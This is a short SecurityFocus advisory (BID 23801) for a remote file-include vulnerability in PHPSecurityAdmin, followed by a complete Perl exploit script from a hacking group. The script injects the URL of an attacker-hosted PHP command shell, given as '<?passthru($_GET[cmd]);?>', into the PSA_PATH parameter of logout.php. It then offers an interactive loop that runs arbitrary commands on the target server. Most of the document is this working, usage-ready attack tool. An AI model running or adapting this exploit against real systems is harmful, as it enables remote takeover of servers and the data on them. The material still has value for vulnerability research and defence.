source: http://www.securityfocus.com/bid/23801/info

PHPSecurityAdmin is prone to a remote file-include vulnerability because it fails to sufficiently sanitize user-supplied input.

Exploiting this issue may allow an attacker to compromise the application and the underlying system; other attacks are also possible.

#+**************************************************************
#+
#-    PHPSecurityAdmin <= Remote File Include Exploit
#+
#+**************************************************************
#+
#- [Script name: PHPSecurityAdmin
#- [Script site: http://sourceforge.net/projects/phpsecurityadm/
#+
#+**************************************************************
#+
#-          Coded by iLker Kandemir
#+
#-          Contact:  ilkerkandemir<at>mynet<dot>com
#-
#-          info: */ Siz Yokken AYYILDIZ Vardi */
#+
#+**************************************************************
#+
#-      tnx: h0tturk,Ekin0x,Gencnesil,Gencturk,Ajann And AYYILDIZ.ORG
#-
#-       h0tturk.com, expw0rm.com, turkistiklal.com, evilc0der.com
#!
#+
#+**************************************************************
# usage:
# perl exploit.pl <PSA Locaction> <shell location> <shell cmd>
#
# perl exploit.pl http://site.com/[PSA_Path]/ http://site.com/cmd.txt cmd
#
# cmd shell example: <?passthru($_GET[cmd]);?>
#
# cmd shell variable: ($_GET[cmd]);
#
$ayt = $ARGV[0];

$aytcmd = $ARGV[1];

$kumanda = $ARGV[2];

if($ayt!~/http:\/\// || $aytcmd!~/http:\/\// || !$kumanda){usage()}

head();
{
print "[shell] \$";
while(<STDIN>)
{
$cmd=$_;
chomp($cmd);

$xpl = LWP::UserAgent->new() or die;

$req = HTTP::Request->new(GET=>$ayt. '/phpsecurityadmin/include/logout.php?PSA_PATH='.$aytcmd.'?&'.$kumanda.'='.$cmd)or die "\nCouldNot connect\n";
$res = $xpl->request($req);

$return = $res->content;
$return =~ tr/[\n]/[&#234;]/;

if (!$cmd) {print "\nEnter a Command\n\n"; $return ="";}

elsif ($return =~/failed to open stream: HTTP request failed!/ || $return =~/: Cannot executea blank command in <b>/)

{print "\nCould Not Connect to cmd Host or Invalid Command Variable\n";exit}

elsif ($return =~/^<br.\/>.<b>Warning/) {print "\nInvalid Command\n\n"}

if($return =~ /(.+)<br.\/>.<b>Warning.(.+)<br.\/>.<b>Warning/)
{

$finreturn = $1;
$finreturn=~ tr/[&#234;]/[\n]/;
print "\r\n$finreturn\n\r";
last;


}
else {print "[shell] \$";}}}last;
sub head()
{
print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n";
print "+         AYYILDIZ TEAM // AYYILDIZ.ORG                             +\n";
print "+ PHPSecurityAdmin <=  Remote File Include Exploit             +\n";
print "+                      AYYILDIZ.ORG                                            +\n";
print "+                iLker Kandemir [ O Bir Dunya Markasi ]              +\n";
print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n";
}
sub usage()
{
head();
print " Usage: perl exploit.pl <PSA Locaction> <shell location> <shell cmd>\r\n\n";
print " <PSA Locaction> - Full path to PSA ex: http://www.xxx-site.com/\r\n";
print " <shell location> - Path to cmd Shell e.g http://www.xxx-host.com/cmd.txt\r\n";
print " <shell cmd> - Command variable used in php shell \r\n";
print " ============================================================================\r\n";
print "                         Find by: iLker Kandemir                                                             \r\n";
print "                           ilkerkandemir@mynet.com                                                       \r\n";
print "                       Thnx:h0tturk,Ekin0x,Gencnesil,Gencturk,Ajann                              \r\n";
print " ============================================================================\r\n";

exit();
}
